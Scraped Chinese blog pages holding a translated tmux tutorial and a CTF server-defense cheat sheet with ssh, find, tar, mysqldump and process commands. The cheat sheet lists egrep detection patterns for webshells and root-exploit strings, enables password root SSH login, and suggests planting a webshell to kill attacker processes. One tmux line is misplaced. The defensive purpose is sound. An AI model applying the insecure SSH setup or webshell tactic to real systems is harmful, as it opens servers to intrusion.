-<p>例如，你可以在服务器上新建一个会话并命名为“nodeapi”，然后用它来挖掘 node REST API 的漏洞（这是我现在的项目）。或者假设你正在咖啡店里工作，需要编译一些代码，而编译要花费 2 个小时才能完成（如果是和我一起工作的话），这时你又不得不离开咖啡店。如果使用了 tmux，你就可以轻松地断开当前的会话，并于稍后方便时重新接入该会话，继续工作。</p>
-<p>这真是太方便了。</p>
-<p>“如何使用 tmux 才能打开多个会话，如何在会话中打开多个标签（Tab），如何在标签中打开多个窗口（Window），又如何在窗口中打开多个窗格（Pane）”，也许有些人对这些操作更感兴趣。而我很少这样做的，因为我不喜欢打开太多的——实际上是尽可能少地打开——这些东西。因此，这篇入门教程主要讲解的也是作为简单的可持久化远程会话模型的 tmux。</p>
-<h3 id="远程操作计算机的生活方式"><a href="#远程操作计算机的生活方式" class="headerlink" title="远程操作计算机的生活方式"></a>远程操作计算机的生活方式</h3><p>机动性是 tmux 带给用户的最大价值。有很多开发者都是在服务器上进行所有工作的，他们只需从某处连接上服务器就可以开始工作了。有了 tmux（或者其他类似的工具），你就可以先坐在旧金山的某个咖啡店里开始在服务器上进行构建的工作，然后断开会话去赶飞机，待飞机降落到纽约市后再继续进行刚才的工作。</p>
-<p>tmux 带来的另一个好处是在移动办公中，作为客户端的计算机变得不再那么重要了。只需要升级你的笔记本，然后从版本库中克隆出 vim 和 tmux 的配置文件，就可以再次回到配置最优的操作环境了。而且这一切只需要短短的几分钟。</p>
-<p>总之，这些就是人们喜爱 tmux 的原因。当然即使你的生活不是四处奔波，也一样能体验到 tmux 带来的好处。</p>
-<h4 id="那么-screen-呢？"><a href="#那么-screen-呢？" class="headerlink" title="那么 screen 呢？"></a>那么 screen 呢？</h4><p>问得好。tmux 和 screen 很像，但比 screen 更好。要问好在哪里，简单的回答就是虽然与 screen 的功能相同，但是 tmux 设计得更好。screen 虽然可用，但是很不稳定。</p>
-<p>以下是一些 tmux 超越 screen 的地方：</p>
-<ul>
-<li>screen 的项目大体上已经终止了，并且代码中有大量的问题</li>
-<li>tmux 是一个活跃的项目，并且其代码库经常进行更新</li>
-<li>tmux 使用的是真正的客户端/服务器模型，而 screen 只是模拟了这种模型的行为</li>
-<li>tmux 同时支持 emacs 和 vim 的快捷键</li>
-<li>tmux 支持自动重命名窗口</li>
-<li>tmux 可以高度的脚本化</li>
-<li>tmux 的窗口分割功能更加先进</li>
-</ul>
-<p>这些优点已经足够了吧，开始使用 tmux 吧。</p>
-<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>首先要告诉诸位的是 tmux 中的一个全局的快捷键开关，开关开启后就可以通过快捷键完成很多任务。</p>
-<h3 id="tmux-的快捷键"><a href="#tmux-的快捷键" class="headerlink" title="tmux 的快捷键"></a>tmux 的快捷键</h3><p>tmux 默认使用 <code>Ctrl-b</code> 作为激活快捷键的开关，开关开启后就可以通过快捷键迅速调用大量的功能。下面就给出一些基本功能的调用方法：</p>
-<p>首先按下</p>
-<p><code>$ Ctrl-b</code></p>
-<p>接下来就可以按下一些后面将会讲解的快捷键了。不过先不要着急，可以先为能方便地使用组合键 <code>Ctrl-b</code> 做一点准备。不妨在操作系统中将键盘上的 CAPSLOCK 键映射为 Ctrl 键，这样当需要按下这个组合键时，小拇指的移动就可以更加舒服了。</p>
-<h3 id="运行-tmux"><a href="#运行-tmux" class="headerlink" title="运行 tmux"></a>运行 tmux</h3><p>好了，下面让我们从运行 tmux 开始。首先选择一台你希望在断开会话后依然可以重新接入的计算机（对我来说这通常是远程服务器），然后在上面运行如下的命令：</p>
-<p><code>$ tmux</code></p>
-<p>很简单对吧。这样就开启了一个 tmux 的会话，你可以断开这个会话并在稍后再重新接入。</p>
-<h3 id="显示所有会话"><a href="#显示所有会话" class="headerlink" title="显示所有会话"></a>显示所有会话</h3><p>由于 tmux 的理念是可以开启多个会话，并且可以自由地断开会话后重新接入，为此我们需要首先能看到可用的会话。有两种方法可以实现这个目的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Via shortcut (by default Ctrl-b)</div><div class="line"># 使用快捷键（默认为 Ctrl-b）</div><div class="line"> </div><div class="line">$ Ctrl-b s</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Via tmux command</div><div class="line"># 使用 tmux 的子命令</div><div class="line"> </div><div class="line">$ tmux ls</div></pre></td></tr></table></figure>
-<p>上面两种方法的效果相同，都可以得到类似下面的结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0: 1 windows (created Thu Nov 28 06:12:52 2013) [80x24] (attached)</div></pre></td></tr></table></figure>
-<h3 id="新建会话"><a href="#新建会话" class="headerlink" title="新建会话"></a>新建会话</h3><p>下面我们就来新建一个会话。可以使用 <code>new</code> 命令新建会话，并且该命令允许以参数的形式传递一个会话名。我的建议是在新建时要提供一个会话名以便于日后管理。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux new -s session-name</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Without naming the new session (not recommended) </div><div class="line"># 新建会话但并不指定名字 (不推荐这样做) </div><div class="line"> </div><div class="line">$ tmux new</div></pre></td></tr></table></figure>
-<h3 id="接入一个之前的会话"><a href="#接入一个之前的会话" class="headerlink" title="接入一个之前的会话"></a>接入一个之前的会话</h3><p>既然我们已经创建了多个带有名称的会话，那么就可以随时接入了，有几种方法可以实现接入会话：</p>
-<p>可以简单地输入 <code>tmux a</code> 命令，这样可以接入第一个可用的会话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux a</div></pre></td></tr></table></figure>
-<p>或者可以通过参数指定一个想接入的会话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ tmux a -t session-name</div></pre></td></tr></table></figure>
-<h3 id="从会话中断开"><a href="#从会话中断开" class="headerlink" title="从会话中断开"></a>从会话中断开</h3><p>可以使用 <code>detach</code> 命令断开已有的会话（因此才会有稍后重新接入会话这么一说）。</p>
-<p><code>$ tmux detach</code></p>
-<p>也可以使用快捷键断开会话：</p>
-<p><code>$ Ctrl-b d</code></p>
-<h3 id="关闭会话"><a href="#关闭会话" class="headerlink" title="关闭会话"></a>关闭会话</h3><p>要关闭会话的话，可以使用如下的命令，该命令和接入会话时所使用的命令很像：</p>
-<p><code>$ tmux kill-session -t session-name</code></p>
-<p>提示：关闭窗口时也可以使用类似的命令，只不过要把 kill-session 换成 kill-window。另外，还可以使用 tmux killall 同时关闭 tmux。</p>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>与其他工具一样，一旦配置好了 tmux，使用起来就将会非常顺手。下面就给出几个通常需要配置的项目：</p>
-<ul>
-<li>tmux 的主要快捷键</li>
-<li>屏幕下方的状态条</li>
-<li>自定义的各种快捷键</li>
-</ul>
-<p>我使用了一些相当简单的配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Set a Ctrl-b shortcut for reloading your tmux config</div><div class="line">#设置 Ctrl-b 快捷键，用于重新加载 tmux 的配置文件</div></pre></td></tr></table></figure>
-<p>access log，error log和system log。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">bind r source-file ~/.tmux.conf</div><div class="line"> </div><div class="line"># Rename your terminals</div><div class="line"># 重命名终端</div><div class="line">set -g set-titles on</div><div class="line">set -g set-titles-string &amp;#039;#(whoami)::#h::#(curl ipecho.net/plain;echo)&amp;#039;</div><div class="line"> </div><div class="line"># Status bar customization</div><div class="line"># 自定义状态条</div><div class="line">set -g status-utf8 on</div><div class="line">set -g status-bg black</div><div class="line">set -g status-fg white</div><div class="line">set -g status-interval 5</div><div class="line">set -g status-left-length 90</div><div class="line">set -g status-right-length 60</div><div class="line">set -g status-left &amp;quot;#[fg=Green]#(whoami)#[fg=white]::#[fg=blue]</div><div class="line">(hostname -s)#[fg=white]::##[fg=yellow]#(curl ipecho.net/plain;echo)&amp;quot;</div><div class="line"> </div><div class="line">set -g status-justify left</div><div class="line">set -g status-right &amp;#039;#[fg=Cyan]#S #[fg=white]%a %d %b %R&amp;#039;</div></pre></td></tr></table></figure>
-<blockquote>
-<p>tmux 默认会先从 <code>/etc/tmux.conf</code> 加载系统级的配置项，然后从 <code>~/.tmux.conf</code> 加载用户级的配置项。也可以使用参数 <code>-f</code> 指定一个配置文件。——译者注</p>
-</blockquote>
-<p>这里有一点值得注意，我使用了 ipecho.net 而不是 icanhazip 来获取计算机当前的 IP 地址（IPv4）。虽然也有很多教程在使用 icanhazip，但是凭我的经验，ipecho.net 的速度更快，更稳定。</p>
-<p>提示：如果你感兴趣，可以来<a href="https://raw.github.com/danielmiessler/tmux/master/.tmux.config" target="_blank" rel="external">这里</a>查看我使用的最新配置。</p>
-<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><p>我平时常用的功能就是这些了。不过，我也会使用一些 tmux 中更强大的功能。</p>
-<h3 id="窗口和窗格"><a href="#窗口和窗格" class="headerlink" title="窗口和窗格"></a>窗口和窗格</h3><p><img src="/images/2017-12-09/7178f37egw1esoxc7zgryj21670nf7li.jpg" alt="img"></p>
-<p>这些高级功能之一就是 tmux 可以将一个会话分割成若干个称为窗口（Window）和窗格（Pane）的相互分离的组件。这种逻辑上的分割使用户可以轻松安排各种各样的操作。</p>
-<p>下面就来看一看这几个概念之间的关系。</p>
-<h4 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h4><p><img src="/images/2017-12-09/7178f37egw1esoxc7hp5oj20gm0bkjs6.jpg" alt="img"></p>
-<p>如上图所示，一个会话（Session）可以包含多个窗口，一个窗口（Window）可以包含多个窗格（Pane）。这就是我对这些概念的简单理解。当然如果诸位有更权威或者更实用的解释，我很乐意洗耳恭听。</p>
-<ul>
-<li>会话适用于分别管理大的工作内容，例如日常工作，实验或是系统管理，都可以分别在一个会话中进行。</li>
-<li>窗口适用于分别管理这些大工作中的项目。例如，在用于实验的会话中可能有一叫做 noderestapi 的窗口用于调试 node REST API，有一个叫做 lua 的窗口用于调试 lua 脚本。</li>
-<li>窗格适用于查看当前的项目。例如，在系统管理的会话中有一个叫做 logs 的窗口，在这个窗口中可以打开多个窗格分别用于查看 access log，error log和system log。</li>
-</ul>
-<p>我们也可以在会话中直接创建窗格，而不需要先创建一个窗口。我有时也会这样做。当阅读完“层次结构”这一小节，希望我的这种做法没有听起来那样恐怖。正如我在一开始谈到的，我更倾向于简化 tmux 的使用。</p>
-<h4 id="在窗格间移动光标"><a href="#在窗格间移动光标" class="headerlink" title="在窗格间移动光标"></a>在窗格间移动光标</h4><p>虽然有默认的在窗格间移动光标的方法，但是我并不清楚是什么。因为我习惯用 vim，所以我会用<code>h</code>，<code>j</code>，<code>k</code> 和 <code>l</code> 键在窗格间移动光标。为此，要加入如下的配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"># Remap window(pane?) navigation to vim</div><div class="line"># 用 vim 的方式在窗格间移动光标</div><div class="line">unbind-key j</div><div class="line">bind-key j select-pane -D</div><div class="line">unbind-key k</div><div class="line">bind-key k select-pane -U</div><div class="line">unbind-key h</div><div class="line">bind-key h select-pane -L</div><div class="line">unbind-key l</div><div class="line">bind-key l select-pane -R</div></pre></td></tr></table></figure>
-<h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a><strong>建议</strong></h2><p>以下几条建议也许会有助于诸位的 tmux 之旅：</p>
-<ol>
-<li>尽可能少打开会话和窗口。人类没有我们自认为的那样善于处理多任务。虽然打开 47 个窗格显得很强大，但是这并没有我们想象的那样实用。</li>
-<li>当确实要使用窗口和窗格时，花一点时间为它们起个有意义的名字。这非常有用，如果只是用 0、1、2 这样的名字，切换会话或窗口时就会非常麻烦。</li>
-<li>从基础的配置、操作开始使用 tmux，别一上来就把自己搞糊涂了。我曾遇到过很多人，他们花费了大量的时间配置 vim 或 tmux，而最终带来的结果却是不但把自己绕进去了，而且项目也没有进展。<h2 id="快捷键参考"><a href="#快捷键参考" class="headerlink" title="快捷键参考"></a>快捷键参考</h2></li>
-</ol>
-<p>按下 <code>Ctrl-b</code> 后的快捷键如下：</p>
-<h3 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h3><ul>
-<li><code>?</code> 获取帮助信息</li>
-</ul>
-<h3 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h3><ul>
-<li><code>s</code> 列出所有会话</li>
-<li><code>$</code> 重命名当前的会话</li>
-<li><code>d</code> 断开当前的会话</li>
-</ul>
-<h3 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h3><ul>
-<li><code>c</code> 创建一个新窗口</li>
-<li><code>,</code> 重命名当前窗口</li>
-<li><code>w</code> 列出所有窗口</li>
-<li><code>%</code> 水平分割窗口</li>
-<li><code>&quot;</code> 竖直分割窗口</li>
-<li><code>n</code> 选择下一个窗口</li>
-<li><code>p</code> 选择上一个窗口</li>
-<li><code>0~9</code> 选择0~9对应的窗口</li>
-</ul>
-<h3 id="窗格管理"><a href="#窗格管理" class="headerlink" title="窗格管理"></a>窗格管理</h3><ul>
-<li><code>%</code> 创建一个水平窗格</li>
-<li><code>&quot;</code> 创建一个竖直窗格</li>
-<li><code>h</code> 将光标移入左侧的窗格*</li>
-<li><code>j</code> 将光标移入下方的窗格*</li>
-<li><code>l</code> 将光标移入右侧的窗格*</li>
-<li><code>k</code> 将光标移入上方的窗格*</li>
-<li><code>q</code> 显示窗格的编号</li>
-<li><code>o</code> 在窗格间切换</li>
-<li><code>}</code> 与下一个窗格交换位置</li>
-<li><code>{</code> 与上一个窗格交换位置</li>
-<li><code>!</code> 在新窗口中显示当前窗格</li>
-<li><code>x</code> 关闭当前窗格&gt; 要使用带“*”的快捷键需要提前配置，配置方法可以参考上文的“在窗格间移动光标”一节。——译者注</li>
-</ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h3><ul>
-<li><code>t</code> 在当前窗格显示时间</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/ops/ctf运维的基本操作/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/12/09/ops/ctf运维的基本操作/" itemprop="url">ctf运维的基本操作</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T14:53:50+08:00">
-                2017-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/运维/" itemprop="url" rel="index">
-                    <span itemprop="name">运维</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1、ssh相关操作"><a href="#1、ssh相关操作" class="headerlink" title="1、ssh相关操作"></a>1、ssh相关操作</h3><p>启动ssh（root亦可登录）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">service sshd start</div><div class="line">vi /etc/ssh/sshd_config</div><div class="line">- 取消PasswordAuthentication yes的注释</div><div class="line">- 将#PermitRootLogin prohibit-password后加入一行PermitRootLogin yes</div><div class="line">service sshd restart</div></pre></td></tr></table></figure>
-<p>ssh登录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">xshell登录</div><div class="line">- ssh [user@]host[ port][;host[ port]]</div><div class="line">- ssh root@172.168.12.13 22   //进入界面中设置用户名、密码</div><div class="line">- ssh 172.168.12.13  ;172.168.12.13 22  //console中设置用户名和密码</div><div class="line"></div><div class="line">linux中ssh登录</div><div class="line">- ssh root@172.168.12.13 -p 22</div></pre></td></tr></table></figure>
-<p>ssh文件传输</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">xshell下载（最好是配合Xftp）</div><div class="line"></div><div class="line">命令下载（scp）</div><div class="line">- scp local_file remote_username@remote_ip:remote_folder </div><div class="line">- scp remote_username@remote_ip:remote_file local_file </div><div class="line">- scp -r local_folder remote_username@remote_ip:remote_folder </div><div class="line">- scp -r remote_username@remote_ip:remote_folder local_folder</div></pre></td></tr></table></figure>
-<h3 id="2、vim常用修改"><a href="#2、vim常用修改" class="headerlink" title="2、vim常用修改"></a>2、vim常用修改</h3><h4 id="2-1-影响范围"><a href="#2-1-影响范围" class="headerlink" title="2.1 影响范围"></a>2.1 影响范围</h4><p>当前文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:命令</div></pre></td></tr></table></figure>
-<p>当前用户的文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">vim ~/.vimrc</div><div class="line">命令</div></pre></td></tr></table></figure>
-<p>所有用户的文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim /etc/vim/vimrc</div><div class="line"></div><div class="line">命令</div></pre></td></tr></table></figure>
-<h4 id="2-2-常用命令"><a href="#2-2-常用命令" class="headerlink" title="2.2 常用命令"></a>2.2 常用命令</h4><p>显示行号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set nu或者:set number</div></pre></td></tr></table></figure>
-<p>不显示行号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set nonu 或者:set nonumber</div></pre></td></tr></table></figure>
-<p>设置tab长度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:set tabstop=4</div></pre></td></tr></table></figure>
-<p>设置文件格式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:set fileformat=unix或者:set ff=unix</div><div class="line">:set fileformat=dos或者:set ff=dos</div></pre></td></tr></table></figure>
-<h3 id="3、find指令"><a href="#3、find指令" class="headerlink" title="3、find指令"></a>3、find指令</h3><p>查找文件类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -type f -name *.php</div></pre></td></tr></table></figure>
-<p>查找某种权限的文件及文件夹</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-perm(permission)</div><div class="line">- -perm mode：精确匹配权限</div><div class="line">- -perm -mode：完全包含此mode时才可以匹配</div><div class="line">- -perm +mode：任何一位匹配即可</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a权限转为2进制后为 000 110 000 000 (0600)</div><div class="line">b权限转为2进制后为 000 010 000 000 (0200)</div><div class="line">c权限转为2进制后为 000 100 000 000 (0400)</div><div class="line">d权限转为2进制后为 000 110 110 000 (0660)</div><div class="line"></div><div class="line">1. 在find . -type f -perm -0600 中的0600权限转为2进制为000 110 000 000,那么0600前的-号代表缺一不可,也就是如果有1的地方必须有1,那么这里找-0600权限的文件,这0600权限里前面有2个位置都是1,所以这里find找-0600权限的文件就是找第4、5位都是1的文件.而只有a d这两个文件前2个位置都是1,所以find . -type f -perm -0600 只会找到a d两个文件.</div><div class="line">2. find . -type f -perm +0600会找到a b c d这4个文件,这是因为: </div><div class="line">   +0600 里的这个+号代表有1即可,也就是有1的位置，任何位置只要有1就可以.那么这里找+0600权限的文件,这0600权限第4、5位都有1,所以这里find 找+0600权限的文件就是找第4、5位只要有一个位置有1的文件就可以了,这4个文件都符合要求所以最后都能被 find . -type f -perm +0600找到</div></pre></td></tr></table></figure>
-<p>多种条件并列查找</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">find / -type f  -perm -04000 -o -perm -02000		// 或关系</div><div class="line"></div><div class="line">find / -type f  -perm -04000 -a -perm -02000		// 与关系</div></pre></td></tr></table></figure>
-<p>查找符合某些特征的文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># 找php木马</div><div class="line">find / -type f -name *.php | xargs egrep -l &quot;mysql_query\($query, $dbconn\)|专用网马|udf.dll|class PHPzip\&#123;|ZIP压缩程序 荒野无灯修改版|$writabledb|AnonymousUserName|eval\(|Root_CSS\(\)|黑狼PHP木马|eval\(gzuncompress\(base64_decode|if\(empty\($_SESSION|$shellname|$work_dir |PHP木马|Array\(&quot;$filename&quot;| eval\($_POST\[|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门&quot;</div><div class="line"></div><div class="line"># 找jsp木马</div><div class="line">find / -type f -name *.jsp | xargs egrep -l &quot;InputStreamReader\(this.is\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门&quot;</div><div class="line"></div><div class="line"># 找HTML恶意代码</div><div class="line">find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330&quot;</div><div class="line"></div><div class="line"># 找perl恶意程序</div><div class="line">find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;</div><div class="line"></div><div class="line"># 找python恶意程序</div><div class="line">find / -type f -name *.py | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb&quot;</div><div class="line"></div><div class="line"># 检查系统是否存在恶意程序</div><div class="line">find / -type f -perm -111  |xargs egrep &quot;UpdateProcessER12CUpdateGatesE6C|CmdMsg\.cpp|MiniHttpHelper.cpp|y4&apos;r3 1uCky k1d\!|execve@@GLIBC_2.0|initfini.c|ptmalloc_unlock_all2|_IO_wide_data_2|system@@GLIBC_2.0|socket@@GLIBC_2.0|gettimeofday@@GLIBC_2.0|execl@@GLIBC_2.2.5|WwW.SoQoR.NeT|2.6.17-2.6.24.1.c|Local Root Exploit|close@@GLIBC_2.0|syscall\(\__NR\_vmsplice,|Linux vmsplice Local Root Exploit|It looks like the exploit failed|getting root shell&quot; 2&gt;/dev/null</div></pre></td></tr></table></figure>
-<h3 id="4、tar指令"><a href="#4、tar指令" class="headerlink" title="4、tar指令"></a>4、tar指令</h3><p>打包文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zcvf /tmp/www.tgz /var/www/html</div></pre></td></tr></table></figure>
-<p>解压文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar zxvf /tmp/www.tgz -C /tmp/</div></pre></td></tr></table></figure>
-<p>不同类型的压缩文件相关参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1、*.tar 用 tar –xvf 解压</div><div class="line">2、*.gz 用 gzip -d或者gunzip 解压</div><div class="line">3、.tar.gz和.tgz 用 tar –xzf 解压</div><div class="line">4、*.bz2 用 bzip2 -d或者用bunzip2 解压</div><div class="line">5、*.tar.bz2用tar –xjf 解压</div><div class="line">6、*.Z 用 uncompress 解压</div><div class="line">7、*.tar.Z 用tar –xZf 解压</div><div class="line">8、*.rar 用 unrar e解压</div><div class="line">9、*.zip 用 unzip 解压</div></pre></td></tr></table></figure>
-<h3 id="5、备份"><a href="#5、备份" class="headerlink" title="5、备份"></a>5、备份</h3><p>网站备份</p>
-<blockquote>
-<p>利用上述tar命令将文件进行打包备份</p>
-</blockquote>
-<p>sql备份</p>
-<blockquote>
-<p>sql备份需要相关工作者，分析网站系统，并得到sql服务器密码，通过相应指令进行备份。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">备份数据库</div><div class="line">- mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql</div><div class="line">- mysqldump --all-databases &gt; bak.sql</div><div class="line"></div><div class="line">还原数据库</div><div class="line">- mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</div></pre></td></tr></table></figure>
-<h3 id="6、杀死进程"><a href="#6、杀死进程" class="headerlink" title="6、杀死进程"></a>6、杀死进程</h3><p>web服务进程分两种，一种是运维者的进程，一种为攻击者的进程。攻击者的进程一般是恶意进程，而且运维者并没有权限杀死改进程。为了杀死这些www-data用户的进程，我们应该在服务器上挂个马，然后通过网络访问的方式删除木马、杀死僵尸进程等。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">用户用ssh偷偷连接web服务器</div><div class="line">- w</div><div class="line">- pkill -kill -t &lt;用户tty&gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">查看所有的进程</div><div class="line">- ps aux</div><div class="line">- ps -ef</div><div class="line"></div><div class="line">查看某个用户的进程</div><div class="line">- ps -f -u www-data</div><div class="line"></div><div class="line">查看已建立的网络连接及进程</div><div class="line">- netstat -antulp | grep EST</div><div class="line"></div><div class="line">查看指定端口被那个进程占用</div><div class="line">- lsof -i:端口号</div><div class="line">- netstat -tunlp|grep 端口号</div></pre></td></tr></table></figure>
